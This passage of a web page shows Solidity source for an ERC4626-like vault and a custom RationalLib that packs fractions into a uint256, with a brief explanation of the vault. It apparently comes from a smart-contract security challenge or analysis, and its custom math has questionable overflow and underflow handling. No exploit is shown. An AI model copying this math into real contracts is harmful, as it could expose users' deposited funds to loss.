<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">totalAssets</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">uint128</span><span class="token" style="color:#d4d4d4">(</span><span>asset</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">convertToShares</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 assets</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>totalShares </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">ZERO</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span>assets</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _assets </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span>assets</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _totalAssets </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">totalAssets</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _shares </span><span class="token" style="color:#d4d4d4">=</span><span> _assets </span><span class="token" style="color:#d4d4d4">/</span><span> _totalAssets </span><span class="token" style="color:#d4d4d4">*</span><span> totalShares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#c586c0">return</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">convertToAssets</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> shares</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>totalShares </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">ZERO</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toUint128</span><span class="token" style="color:#d4d4d4">(</span><span>shares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _totalAssets </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">totalAssets</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _assets </span><span class="token" style="color:#d4d4d4">=</span><span> shares </span><span class="token" style="color:#d4d4d4">/</span><span> totalShares </span><span class="token" style="color:#d4d4d4">*</span><span> _totalAssets</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toUint128</span><span class="token" style="color:#d4d4d4">(</span><span>_assets</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toUint128</span><span class="token" style="color:#d4d4d4">(</span><span>totalShares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address account</span><span class="token" style="color:#d4d4d4">)</span><span> external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toUint128</span><span class="token" style="color:#d4d4d4">(</span><span>sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>account</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p>The vault implements a shares-based system similar to ERC4626:</p>
<ul>
<li><strong>Deposits/Mints:</strong> Users deposit assets to receive proportional shares</li>
<li><strong>Withdrawals/Redeems:</strong> Users burn shares to retrieve underlying assets</li>
<li><strong>Conversion Logic:</strong> Dynamic exchange rates between assets and shares based on vault balance</li>
<li><strong>Precision:</strong> Uses custom Rational math instead of standard integer arithmetic</li>
</ul>
<h3>RationalLib Contract</h3>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-javascript" style="white-space:pre;color:#9cdcfe;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>
</span><span></span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: UNLICENSED</span><span>
</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.20</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">// Upper 128 bits is the numerator, lower 128 bits is the denominator</span><span>
</span><span>type </span><span class="token" style="color:#4ec9b0">Rational</span><span> is uint256</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>using </span><span class="token" style="color:#d4d4d4">{</span><span>add </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#d4d4d4">,</span><span> sub </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span class="token" style="color:#d4d4d4">,</span><span> mul </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span class="token" style="color:#d4d4d4">,</span><span> div </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span class="token" style="color:#d4d4d4">,</span><span> eq </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span class="token" style="color:#d4d4d4">,</span><span> neq </span><span class="token" style="color:#c586c0">as</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">for</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span> global</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">// ======================================== CONVERSIONS ========================================</span><span>
</span>
<span>library </span><span class="token" style="color:#4ec9b0">RationalLib</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">Rational</span><span> constant </span><span class="token" style="color:#9cdcfe">ZERO</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">wrap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 x</span><span class="token" style="color:#d4d4d4">)</span><span> internal pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">toUint128</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">)</span><span> internal pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 numerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 denominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> numerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#dcdcaa">uint128</span><span class="token" style="color:#d4d4d4">(</span><span>numerator </span><span class="token" style="color:#d4d4d4">/</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">// ======================================== OPERATIONS ========================================</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 xDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 yDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> y</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>yNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> x</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// (a / b) + (c / d) = (ad + cb) / bd</span><span>
</span><span>    uint256 numerator </span><span class="token" style="color:#d4d4d4">=</span><span> xNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator </span><span class="token" style="color:#d4d4d4">+</span><span> yNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> xDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    uint256 denominator </span><span class="token" style="color:#d4d4d4">=</span><span> xDenominator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sub</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 xDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 yDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>yNumerator </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Underflow&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// (a / b) - (c / d) = (ad - cb) / bd</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// a / b &gt;= c / d implies ad &gt;= cb, so the subtraction will never underflow when x &gt;= y</span><span>
</span><span>    uint256 numerator </span><span class="token" style="color:#d4d4d4">=</span><span> xNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator </span><span class="token" style="color:#d4d4d4">-</span><span> yNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> xDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    uint256 denominator </span><span class="token" style="color:#d4d4d4">=</span><span> xDenominator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">mul</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 xDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 yDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">||</span><span> yNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">ZERO</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// (a / b) * (c / d) = ac / bd</span><span>
</span><span>    uint256 numerator </span><span class="token" style="color:#d4d4d4">=</span><span> xNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> yNumerator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    uint256 denominator </span><span class="token" style="color:#d4d4d4">=</span><span> xDenominator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">div</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 xDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 yDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">ZERO</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>yNumerator </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Division by zero&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// (a / b) / (c / d) = ad / bc</span><span>
</span><span>    uint256 numerator </span><span class="token" style="color:#d4d4d4">=</span><span> xNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    uint256 denominator </span><span class="token" style="color:#d4d4d4">=</span><span> xDenominator </span><span class="token" style="color:#d4d4d4">*</span><span> yNumerator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">eq</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
